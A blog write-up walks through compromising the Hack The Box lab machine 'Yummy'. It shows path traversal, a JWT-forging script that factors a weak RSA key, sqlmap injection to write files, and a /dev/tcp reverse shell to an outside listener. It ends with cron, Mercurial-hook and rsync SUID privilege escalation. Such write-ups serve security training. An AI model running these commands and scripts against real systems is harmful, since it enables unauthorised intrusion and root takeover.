---
layout: post
title: "Yummy HTB writeup"
subtitle: "Walkethrough for the Yummy HTB machine."
date: 2024-10-08 23:45:13
background: '/img/posts/04.jpg'

---

## Report  

Beginning with the default `nmap` scan  

```bash
nmap 10.129.24.133 -sV
```

We get some open ports  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009085548.png" alt="1" style="width:700px; height:auto;">
<br/> 


- `22 SSH`
- `80 HTTP` running the `Caddy` server

Looking for exploit for `Caddy` but found nothing useful  

Interacting with the `HTTP` service by opening the browser and type the `IP` address of the remote machine  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009085810.png" alt="1" style="width:700px; height:auto;">
<br/> 

We are redirected to a domain `yummy.htb`  

Adding it to the `/etc/hosts` file 

```bash
 echo '10.129.24.133     yummy.htb' >> /etc/hosts
```

Checking the file after the modifications

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009090105.png" alt="1" style="width:700px; height:auto;">
<br/> 

Refresh the page and we are welcomed with an `index` page.

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009090150.png" alt="1" style="width:700px; height:auto;">
<br/>

Following standard methodology, we check source code

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009090228.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a template and a version  `Restaurantly - v3.1.0` made by `Bootstrap`.  
Searching for exploits for this specific template led to nowhere.  
Opening `burpsuite` and begin building a tree for the website using `Target/site map` on `burpsuite`  

Exploring the website and building the `site map`   
By clicking on `book table`  button, we can reserve a table 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009090903.png" alt="1" style="width:700px; height:auto;">
<br/>

We can also login 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009090933.png" alt="1" style="width:700px; height:auto;">
<br/>

but before, we register 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091015.png" alt="1" style="width:700px; height:auto;">
<br/>

After logging in we can see a different `index page` and a `dashboard` button that appears  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091109.png" alt="1" style="width:700px; height:auto;">
<br/>

We  book a table 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091142.png" alt="1" style="width:700px; height:auto;">
<br/>

Going back to the `dashboard` we can see our reservation 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091237.png" alt="1" style="width:700px; height:auto;">
<br/>

Clicking on  `save Icalendar`, we have a file being downloaded 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091426.png" alt="1" style="width:700px; height:auto;">
<br/>

Now getting back to our `site map`  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091630.png" alt="1" style="width:700px; height:auto;">
<br/>

What is interesting here is maybe  the `login`, `register` and an  `export` directory 

- `Login` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091718.png" alt="1" style="width:700px; height:auto;">
<br/>

The information is being sent in `Json` format, we get a cookie that seems being `JWT` 
- `Register` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009091920.png" alt="1" style="width:700px; height:auto;">
<br/>

Same `Json` format and a response that seems to be an `API request/response`

- `export` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009092025.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a request being made to fetch the `reservation.ics` file, interesting   


Focusing on the `export` as it may be a potential `LFI`   
Sending it to the `repeater` and click `send` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009092224.png" alt="1" style="width:700px; height:auto;">
<br/>

we get an `internal server error 500`. this is happening because the `session cookie` is for one time use. If we want to reproduce the request we need to make it directly from the server to grab a new `session cookie` (smart :)) )  

Opening the `intercept` and begin intercepting the request after clicking on` save Icanlendar` button 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009092550.png" alt="1" style="width:700px; height:auto;">
<br/>

A `GET` request to `/reminder` to grab a new `session cookie`   

And here is our page   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009092618.png" alt="1" style="width:700px; height:auto;">
<br/>

Changing the request to grab `/etc/passwd` file  `/export/../../../../../../../../../../../etc/passwd`  

and we get a hit   

reading the `/etc/passwd` file   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009092817.png" alt="1" style="width:700px; height:auto;">
<br/>

We get users `qa`, `dev` and `root`  

Decided to go for the `/etc/crontab` file
Doing same steps as the above but changing the file from `passwd` to `crontab`  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009094800.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see some `crontabs` running

Downloading each one of them excluding `table_cleanup.sh` because it runs every 15 minutes so can look at it later on  to understand what is happening and look for a way to exploit  

- `app_backup.sh`

```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

- `dbmonitor.sh`

```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

Analyzing each script.

-  `app_backup.sh`:  
it create a backup of the application running on the `http` port and put it in a `zip` file at `/var/www/backupapp.zip`  

Decided to download it to try and analyze the source code   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009095425.png" alt="1" style="width:700px; height:auto;">
<br/>

in `opt/app/config/signature.py`, we can find an `RSA` `key_pair` generator 

```python
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

It can be interesting if we want to do `JWT` attacks.  

And here is the verification `opt/app/middleware/verification.py`  

```python
#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500

```

We can impersonate the `administrator` but lets look at that later.    

And here is the `app.py` file in `opt/app`  

```python 

from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
import tempfile
import os
import shutil
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
from ics import Calendar, Event
from middleware.verification import verify_token
from config import signature
import pymysql.cursors
from pymysql.constants import CLIENT
import jwt
import secrets
import hashlib

app = Flask(__name__, static_url_path='/static')
temp_dir = ''
app.secret_key = secrets.token_hex(32)

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}

access_token = ''

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()

@app.route('/logout', methods=['GET'])
def logout():
    response = make_response(redirect('/login'))
    response.set_cookie('X-AUTH-Token', '')
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
        if request.method == 'GET':
            return render_template('register.html', message=None)
        elif request.method == 'POST':
            role_id = 'customer_' + secrets.token_hex(4)
            email = request.json.get('email')
            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
            if not email or not password:
                return jsonify(error="email or password is missing"), 400
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "SELECT * FROM users WHERE email=%s"
                    cursor.execute(sql, (email,))
                    existing_user = cursor.fetchone()
                    if existing_user:
                        return jsonify(error="Email already exists"), 400
                    else:
                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
                        cursor.execute(sql, (email, password, role_id))
                        connection.commit()
                        return jsonify(message="User registered successfully"), 201
            finally:
                connection.close()


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
                    connection.commit()
                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')
            except Exception as e:
                print(e)
            return redirect('/#book-a-table')
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')


def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()

    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"

    cal.events.add(event)

    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

@app.route('/export/<path:filename>')
def export_file(filename):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])

        finally:
            connection.close()

        return render_template('dashboard.html', appointments=appointments_sorted)

@app.route('/delete/<appointID>')
def delete_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    elif validation == "administrator":
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments where appointment_id= %s;"
                cursor.execute(sql, (appointID,))
                connection.commit()

                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("admindashboard"))
    else:
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
                cursor.execute(sql, (appointID, validation))
                connection.commit()

                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("dashboard"))
        flash("Something went wrong!","error")
        return redirect(url_for("dashboard"))

@app.route('/reminder/<appointID>')
def reminder_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))

    connection = pymysql.connect(**db_config)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
            result = cursor.execute(sql, (validation, appointID))
            if result != 0:
                connection.commit()
                appointments = cursor.fetchone()
                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
                connection.close()
                flash("Reservation downloaded successfully","success")
                return redirect(url_for('export_file', filename=filename))
            else:
                flash("Something went wrong!","error")
    except:
        flash("Something went wrong!","error")

    return redirect(url_for("dashboard"))

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))

        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()

            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)



if __name__ == '__main__':
    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)
    
 ```

We can find the function that encrypt the `JWT` and a new route called `/admindashboard` that is only visible to anyone with the `administrator` role.  


 - dbmonitor.sh:  
We can see that this script check for a specific  file and if it is here and a specific string is not inside it, a function gets executed and execute a specific file  

The script checks for `/data/scripts/dbstatus.json` file if it is not missing and then checks for a specific string `database is down` 
if it does not find it, it removes the file and execute a specific file called `/data/scripts/fixer-v`  

`Exploitation`: if we can inject those 2 files inside the machine under the correct path of `/data/scripts`, the script will execute the malicious `fixer` and we gain a `reverse shell` under `mysql` user.  

We need to find a way to edit in the machine files  

Checking the `admindashboard` function found in the `app.py`  

``` python
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))

        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()

            return 
```

We can see a potential `SQL injection`.  

What we want to do now is to modify the `JWT` token to impersonate the `administrator`.  

With the information given, we craft a `python` script that takes the original `JWT` token from the user we are logged to and change it by injecting the newly created `JWT` token.   

```python
import base64
import json
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy

jwt_token = "JWT_TOKEN_OF_THE_USER"

def apply_padding(encoded_str):
    while len(encoded_str) % 4 != 0:
        encoded_str += '='
    return encoded_str

def decode_base64_url(input_str):
    input_str = apply_padding(input_str)
    input_str = input_str.replace('-', '+').replace('_', '/')
    return base64.b64decode(input_str)

# Parse and decode the JWT payload
decoded_payload = json.loads(decode_base64_url(jwt_token.split(".")[1]).decode())
modulus_n = int(decoded_payload["jwk"]['n'])
prime_p, prime_q = list((sympy.factorint(modulus_n)).keys())
public_exp = 65537
totient_n = (prime_p - 1) * (prime_q - 1)
private_exp = pow(public_exp, -1, totient_n)
rsa_key_data = {'n': modulus_n, 'e': public_exp, 'd': private_exp, 'p': prime_p, 'q': prime_q}
rsa_key = RSA.construct((rsa_key_data['n'], rsa_key_data['e'], rsa_key_data['d'], rsa_key_data['p'], rsa_key_data['q']))
pem_private_key = rsa_key.export_key()

# Load private key
loaded_private_key = serialization.load_pem_private_key(
    pem_private_key,
    password=None,
    backend=default_backend()
)
rsa_public_key = loaded_private_key.public_key()

# Decode JWT, modify role, and re-encode
decoded_jwt_data = jwt.decode(jwt_token, rsa_public_key, algorithms=["RS256"])
decoded_jwt_data["role"] = "administrator"

# Generate new JWT
updated_token = jwt.encode(decoded_jwt_data, loaded_private_key, algorithm="RS256")
print(updated_token)
```

Crafting the Token and injecting it in the session   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009105808.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the new token and try to open the `/admindashboard`.  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009110655.png" alt="1" style="width:700px; height:auto;">
<br/>

It is successful.   

A potential `SQL injection` was already identified. Making a request using the search query   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009110824.png" alt="1" style="width:700px; height:auto;">
<br/>

Capture the request in `burpsuite`, copying it and save it into a file   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009110945.png" alt="1" style="width:700px; height:auto;">
<br/>

Passing the request to `sqlmap` 

```bash
sqlmap -r admin_req --level 3 --risk 3 --batch --dbs
```

We get a hit   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009111042.png" alt="1" style="width:700px; height:auto;">
<br/>

the exploitation was successful  
As expected, found nothing useful on the `database` as we need to put files on the system.  
Using `sqlmap` to do so.  
Testing with a dummy file   

```bash
sqlmap -r admin_req --level 3 --risk 3 --batch --file-write "dummy " --file-dest "/tmp/dummy"
``` 

The upload was successful 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009111302.png" alt="1" style="width:700px; height:auto;">
<br/>

Crafting the new malicious files 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009113050.png" alt="1" style="width:700px; height:auto;">
<br/>

Now uploading them using `sqlmap`

```bash
 sqlmap -r admin_req --level 3 --risk 3 --batch --file-write "fixer-v" --file-dest "/data/scripts/fixer-v"
```

```bash
sqlmap -r admin_req --level 3 --risk 3 --batch --file-write "dbstatus.json" --file-dest "/data/scripts/dbstatus.json"
```

The files were uploaded successfully. Now waiting for a connection back to our `listener`  
<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009114519.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a connection as `mysql`  

We check the permissions we have, nothing to actually do but a small `misconfiguration`

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009114745.png" alt="1" style="width:700px; height:auto;">
<br/>

The permissions are clear as we can change in the scripts directory   
Rechecking the `crontab` file 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009121839.png" alt="1" style="width:700px; height:auto;">
<br/>

the `app_backup.sh` is being executed as `www-data` every 1 minute.   
This is our gateway to escalate our privileges and connect as `www-data`.   

- Creating a new `app_backup.sh` file in the `/tmp` directory and put a `reverse shell` payload   

```bash
bash -c "sh -i >& /dev/tcp/10.10.16.57/4444 0>&1"
```

- make a one liner to automate the removing of the `app_backup.sh` script and add the malicious one and wait to get executed.   
-  Need to make it multiple times as a `cleaner` works immediately on the machine and removes our malicious script.    

```bash
rm /data/scripts/app_backup.sh;cp /tmp/app_backup.sh /data/scripts/app_backup.sh;date;cat /data/scripts/app_backup.sh;
```

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009143440.png" alt="1" style="width:700px; height:auto;">
<br/>

And we get a connection to our listener  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009143504.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking for possible credentials in files system  

Found in `/var/www/app-qatesting/.hg/store/data/app.py.i` credentials for user `qa`   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009143856.png" alt="1" style="width:700px; height:auto;">
<br/>

`qa:jPAd!XQCtn8Oc@2B`

`ssh` with the new credentials discovered  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009143959.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking `sudo` permissions 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009150326.png" alt="1" style="width:700px; height:auto;">
<br/>

user `qa` can run the following command as `dev`.  
what is `hg`?   


<blockquote>
  <p><strong>HG:</strong> Mercurial is primarily a command-line tool, offering a powerful and extensive set of commands for developers. SourceTree, while providing a graphical interface, also allows users to execute some basic command-line operations</p>
</blockquote>

It is same as `git` but for less experienced users.  
Means that if we can `pull` a repository, we can add a `hook` that will get triggered when we do this action.  

- Go to a `temp` directory and make a new directory called `.hg`  
- copy the `.hgrc` file and rename it by removing the dot in the `.hg` directory 
- Add the `hook` payload   

```
[hooks]
post-pull = /tmp/revshell.sh
```

- Create a `reverse shell` as described in the payload 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009152935.png" alt="1" style="width:700px; height:auto;">
<br/>

The new edited `hgrc` file 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009153108.png" alt="1" style="width:700px; height:auto;">
<br/>

Now execute the command but don't forget to give full permissions to the newly created `.hg` directory  and the reverse shell file  

```bash
sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```

We get a callback   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009153822.png" alt="1" style="width:700px; height:auto;">
<br/>

Upgrade the `shell` by creating a pair of `SSH keys`   

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154225.png" alt="1" style="width:700px; height:auto;">
<br/>

copy the `private key` on our `local machine` and the `public` change it to `authorized_keys` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154340.png" alt="1" style="width:700px; height:auto;">
<br/>

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154405.png" alt="1" style="width:700px; height:auto;">
<br/>

change permissions to `600` on the `id_rsa` key and `ssh` with the key

```bash
chmod 600 id_rsa;ssh dev@yummy.htb -i id_rsa
```

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154522.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking `sudo` permissions under the `dev` user  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154720.png" alt="1" style="width:700px; height:auto;">
<br/>

We can execute an interesting command as `root`  
Checking the manual of `rsync`   

```bash
man rsync
```

It has some interesting arguments  

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009154906.png" alt="1" style="width:700px; height:auto;">
<br/>

`--chmod` and `--chown` to change `ownership` and `permissions` of directory or a specific file  

- The command let us actually copy all the content of the  `/home/dev/app-production/`  in the `/opt/app` as `root`
-  We have write access on the `/home/dev/app-production/` directory so what we can do is add a malicious script called `rooted`

```bash
/bin/bash -p
```

- give `SUID` binary to the file 

```bash
chmod +s /home/dev/app-production/rooted
```

- execute the following command 

```bash
sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/ --chown root:root /opt/app/
```

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009160245.png" alt="1" style="width:700px; height:auto;">
<br/>

The cleanup process cleans everything and we do not have time to execute the file, making a one liner to execute the full command  

```bash
echo 'chmod +s /bin/bash' > /home/dev/app-production/rooted;cmod +s /home/dev/app-production/rooted;sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/ --chown root:root /opt/app/; bash /opt/app/rooted;
```

But it did not work so changing the payload to copy the `/bin/bash` binary and do the same steps 


```bash
cp /bin/bash /home/dev/app-production/rooted;chmod +s /home/dev/app-production/rooted;sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/ --chown r
oot:root /opt/app/;/opt/app/rooted -p;
```

And we are `root` 

<br/> 
<img src="/img/yummy_screenshots/Pasted image 20241009161704.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was successfully pawned 

<br/> 
<img src="/img/yummy_screenshots/Screenshot_1.png" alt="1" style="width:700px; height:auto;">
<br/>



